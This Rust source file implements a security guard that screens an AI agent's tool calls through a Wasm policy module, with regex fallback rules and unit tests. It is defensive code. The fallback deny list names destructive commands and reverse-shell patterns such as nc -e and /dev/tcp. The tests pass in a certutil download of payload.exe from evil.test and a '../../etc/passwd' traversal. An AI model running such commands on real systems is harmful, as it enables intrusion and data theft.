use anyhow::{anyhow, Result};
use benshu_compression::{head_tail_with_notice, TruncationNotice};
use std::path::{Path, PathBuf};
use std::sync::Arc;
use tokio::sync::OnceCell;
use tracing::{error, info, warn};
use wasmtime::*;
use wasmtime_wasi::{ResourceTable, WasiCtx, WasiCtxBuilder, WasiView};

/// Host state for Wasm Security Guard execution
struct GuardHostState {
    wasi_ctx: WasiCtx,
    table: ResourceTable,
}

impl WasiView for GuardHostState {
    fn ctx(&mut self) -> &mut WasiCtx {
        &mut self.wasi_ctx
    }
    fn table(&mut self) -> &mut ResourceTable {
        &mut self.table
    }
}

/// The Wasm-based Security Policy Guard.
///
/// This acts as a "Gatekeeper" that intercepts tool calls before they reach
/// the Native Shell Runtime (Job Object) and filters results before they
/// return to the Agent.
pub struct PolicyGuard {
    engine: Engine,
    module: OnceCell<component::Component>,
    guard_path: PathBuf,
}

impl PolicyGuard {
    const DEFAULT_MAX_ARGUMENT_BYTES: usize = 8_000;
    const COORDINATION_MAX_ARGUMENT_BYTES: usize = 64 * 1024;
    const ARTIFACT_MAX_ARGUMENT_BYTES: usize = 128 * 1024;

    fn requires_shell_style_guard(tool_name: &str) -> bool {
        matches!(
            tool_name.trim().to_lowercase().as_str(),
            "terminal"
                | "shell"
                | "bash"
                | "exec"
                | "execute"
                | "run_command"
                | "git_ops"
                | "desktop_sense"
        )
    }

    fn max_argument_bytes(tool_name: &str) -> usize {
        match tool_name.trim().to_lowercase().as_str() {
            "delegate" | "handover" | "decompose" | "multi_agent_audit" => {
                Self::COORDINATION_MAX_ARGUMENT_BYTES
            }
            "novel_studio" | "writing_studio" | "write_file" | "edit_file" => {
                Self::ARTIFACT_MAX_ARGUMENT_BYTES
            }
            _ => Self::DEFAULT_MAX_ARGUMENT_BYTES,
        }
    }

    pub fn new(data_dir: &Path) -> Self {
        let mut config = Config::new();
        config.async_support(true);
        config.consume_fuel(true);

        let engine = Engine::new(&config).expect("Failed to create Wasm engine for Security Guard");
        let guard_path = data_dir.join("security").join("policy_guard.wasm");

        Self {
            engine,
            module: OnceCell::new(),
            guard_path,
        }
    }

    async fn get_module(&self) -> Result<&component::Component> {
        self.module
            .get_or_try_init(|| async {
                if !self.guard_path.exists() {
                    return Err(anyhow!(
                        "Security policy guard Wasm file not found at {:?}",
                        self.guard_path
                    ));
                }
                let engine = self.engine.clone();
                let path = self.guard_path.clone();
                tokio::task::spawn_blocking(move || {
                    component::Component::from_file(&engine, &path)
                        .map_err(|e| anyhow!("Failed to compile security policy guard: {}", e))
                })
                .await
                .unwrap_or_else(|e| Err(anyhow!("Task failed to execute: {}", e)))
            })
            .await
    }

    fn traversal_check_inputs(args: &str) -> Vec<String> {
        let Ok(value) = serde_json::from_str::<serde_json::Value>(args) else {
            return vec![args.to_string()];
        };

        let mut inputs = Vec::new();
        Self::collect_path_like_json_strings(None, &value, &mut inputs);
        inputs
    }

    fn collect_path_like_json_strings(
        key: Option<&str>,
        value: &serde_json::Value,
        out: &mut Vec<String>,
    ) {
        match value {
            serde_json::Value::String(text) => {
                if key.is_some_and(Self::json_key_is_path_like) {
                    out.push(text.clone());
                }
            }
            serde_json::Value::Array(items) => {
                for item in items {
                    Self::collect_path_like_json_strings(key, item, out);
                }
            }
            serde_json::Value::Object(map) => {
                for (child_key, child_value) in map {
                    Self::collect_path_like_json_strings(Some(child_key), child_value, out);
                }
            }
            _ => {}
        }
    }

    fn json_key_is_path_like(key: &str) -> bool {
        let normalized = key.trim().to_ascii_lowercase();
        matches!(
            normalized.as_str(),
            "path"
                | "file"
                | "filepath"
                | "file_path"
                | "filename"
                | "file_name"
                | "dir"
                | "directory"
                | "source_path"
                | "target_path"
                | "output_path"
                | "input_path"
        ) || normalized.ends_with("_path")
    }

    /// Pre-flight security check before tool execution.
    /// Intercepts dangerous commands, path breakouts, and resource over-claims.
    pub async fn pre_check(&self, tool_name: &str, args: &str) -> Result<()> {
        // --- 1. Attempt Wasm Execution (Primary Defense) ---
        match self.run_wasm_check("pre_check", tool_name, args).await {
            Ok(output) => {
                if output.trim() == "OK" || output.trim().to_lowercase() == "pass" {
                    return Ok(());
                } else {
                    return Err(anyhow!("Wasm Policy Violation: {}", output));
                }
            }
            Err(e) => {
                // If Wasm is missing or fails, fall back to "Hardcoded Safety"
                warn!("Wasm Policy Guard unavailable or failed: {}. Falling back to internal Rust safety rules.", e);
                self.internal_rust_pre_check(tool_name, args)
            }
        }
    }

    /// Post-execution result filtering.
    /// Redacts secrets and truncates oversized output.
    pub async fn post_filter(&self, result: &str) -> String {
        match self.run_wasm_filter("post_filter", result).await {
            Ok(filtered) => filtered,
            Err(_) => {
                // Fallback to internal Rust filtering
                self.internal_rust_post_filter(result)
            }
        }
    }

    /// Internal Rust implementation of the safety rules (Fallback + Defense in Depth)
    fn internal_rust_pre_check(&self, tool_name: &str, args: &str) -> Result<()> {
        use regex::Regex;

        // Generic path traversal should stay blocked for every tool surface.
        let universal_patterns = [r"\.\./", r"\.\.\\"];
        let traversal_inputs = Self::traversal_check_inputs(args);

        for pattern in universal_patterns {
            if let Ok(re) = Regex::new(pattern) {
                if traversal_inputs
                    .iter()
                    .any(|candidate| re.is_match(candidate))
                {
                    return Err(anyhow!(
                        "Blocked by Internal Safety Guard: Matches dangerous pattern '{}'",
                        pattern
                    ));
                }
            }
        }

        // Shell/system-command heuristics should only gate tools that actually execute commands.
        if Self::requires_shell_style_guard(tool_name) {
            let dangerous_patterns = [
                // Linux/Unix privilege escalation & destruction
                r"(?i)\b(sudo|su|dos2unix|chown|chmod)\b",
                r"(?i)\brm\s+-[rf]{1,2}",
                // Windows disruption & legacy shells
                r"(?i)\b(format|vssadmin|certutil|bitsadmin)\b",
                r"(?i)\b(del|rd|erase)\b.*\s/[sqrf]{1,3}",
                r"(?i)\b(powershell|pwsh|cmd)(\.exe)?\s+(-(enc|encodedcommand|c|command))?",
                // Network reverse shells / Tunnels
                r"(?i)\b(nc|netcat|ncat)\b.*-e",
                r"/dev/(tcp|udp)/",
            ];

            for pattern in dangerous_patterns {
                if let Ok(re) = Regex::new(pattern) {
                    if re.is_match(args) {
                        return Err(anyhow!(
                            "Blocked by Internal Safety Guard: Matches dangerous pattern '{}'",
                            pattern
                        ));
                    }
                }
            }
        }

        // 2. Entropy / Length check: prevent oversized malicious injections.
        // Natural-language coordination/artifact tools need enough room for
        // task contracts, while command-like tools stay on a tighter budget.
        let max_argument_bytes = Self::max_argument_bytes(tool_name);
        if args.len() > max_argument_bytes {
            return Err(anyhow!(
                "Blocked by Internal Safety Guard: Arguments too long ({} bytes > {} bytes)",
                args.len(),
                max_argument_bytes
            ));
        }

        Ok(())
    }

    fn internal_rust_post_filter(&self, result: &str) -> String {
        // Simple truncation for fallback
        const MAX_SIZE: usize = 1024 * 1024; // 1MB
        if result.len() > MAX_SIZE {
            head_tail_with_notice(result, 2000, TruncationNotice::ContextSafety).content
        } else {
            result.to_string()
        }
    }

    async fn run_wasm_check(&self, func: &str, tool: &str, args: &str) -> Result<String> {
        let module = self.get_module().await?;
        let mut linker = component::Linker::new(&self.engine);
        wasmtime_wasi::add_to_linker_async(&mut linker)?;

        let wasi = WasiCtxBuilder::new()
            .inherit_stdout() // For log tracing inside Wasm
            .build();

        let mut store = Store::new(
            &self.engine,
            GuardHostState {
                wasi_ctx: wasi,
                table: ResourceTable::new(),
            },
        );

        store.set_fuel(1_000_000)?; // Small budget for policy check

        let instance = linker.instantiate_async(&mut store, module).await?;
        let func = instance.get_typed_func::<(String, String), (String,)>(&mut store, func)?;

        let (res,) = func
            .call_async(&mut store, (tool.to_string(), args.to_string()))
            .await
            .map_err(|e| anyhow!("Wasm policy runtime error: {}", e))?;
        Ok(res)
    }

    async fn run_wasm_filter(&self, func: &str, input: &str) -> Result<String> {
        let module = self.get_module().await?;
        let mut linker = component::Linker::new(&self.engine);
        wasmtime_wasi::add_to_linker_async(&mut linker)?;

        let wasi = WasiCtxBuilder::new().build();
        let mut store = Store::new(
            &self.engine,
            GuardHostState {
                wasi_ctx: wasi,
                table: ResourceTable::new(),
            },
        );

        store.set_fuel(2_000_000)?;

        let instance = linker.instantiate_async(&mut store, module).await?;
        let func = instance.get_typed_func::<(String,), (String,)>(&mut store, func)?;

        let (res,) = func
            .call_async(&mut store, (input.to_string(),))
            .await
            .map_err(|e| anyhow!("Wasm policy runtime error: {}", e))?;
        Ok(res)
    }
}

#[cfg(test)]
mod tests {
    use super::PolicyGuard;
    use std::path::PathBuf;

    fn guard() -> PolicyGuard {
        PolicyGuard::new(&PathBuf::from("/tmp"))
    }

    #[test]
    fn delegate_natural_language_payload_is_not_treated_like_shell_input() {
        let guard = guard();
        let args =
            r#"{"role":"researcher","task":"请搜索柳叶刀最新治疗心脏病的论文，并保存进知识库。"}"#;
        assert!(guard.internal_rust_pre_check("delegate", args).is_ok());
    }

    #[test]
    fn delegate_allows_long_natural_language_contracts() {
        let guard = guard();
        let task = "请根据这份创作合同继续执行。".repeat(700);
        let args = serde_json::json!({
            "role": "writer",
            "task": task,
            "full_user_request": "写一部长期连载作品，正文落盘，聊天只返回进度。"
        })
        .to_string();
        assert!(args.len() > PolicyGuard::DEFAULT_MAX_ARGUMENT_BYTES);
        assert!(guard.internal_rust_pre_check("delegate", &args).is_ok());
    }

    #[test]
    fn default_tool_argument_budget_stays_conservative() {
        let guard = guard();
        let args = "x".repeat(PolicyGuard::DEFAULT_MAX_ARGUMENT_BYTES + 1);
        assert!(guard
            .internal_rust_pre_check("unknown_tool", &args)
            .is_err());
    }

    #[test]
    fn shell_tool_still_blocks_dangerous_windows_commands() {
        let guard = guard();
        let args =
            r#"{"command":"certutil -urlcache -f http://evil.test/payload.exe payload.exe"}"#;
        assert!(guard.internal_rust_pre_check("terminal", args).is_err());
    }

    #[test]
    fn path_traversal_stays_blocked_for_all_tools() {
        let guard = guard();
        let args = r#"{"path":"../../etc/passwd"}"#;
        assert!(guard.internal_rust_pre_check("read_file", args).is_err());
    }

    #[test]
    fn write_file_content_is_not_treated_as_path_traversal() {
        let guard = guard();
        let args = r#"{"path":"drafts/chapter.md","content":"A fictional note mentions ..\\archive without requesting that path."}"#;
        assert!(guard.internal_rust_pre_check("write_file", args).is_ok());
    }

    #[test]
    fn write_file_path_still_blocks_windows_traversal() {
        let guard = guard();
        let args = r#"{"path":"..\\outside.md","content":"safe body"}"#;
        assert!(guard.internal_rust_pre_check("write_file", args).is_err());
    }
}
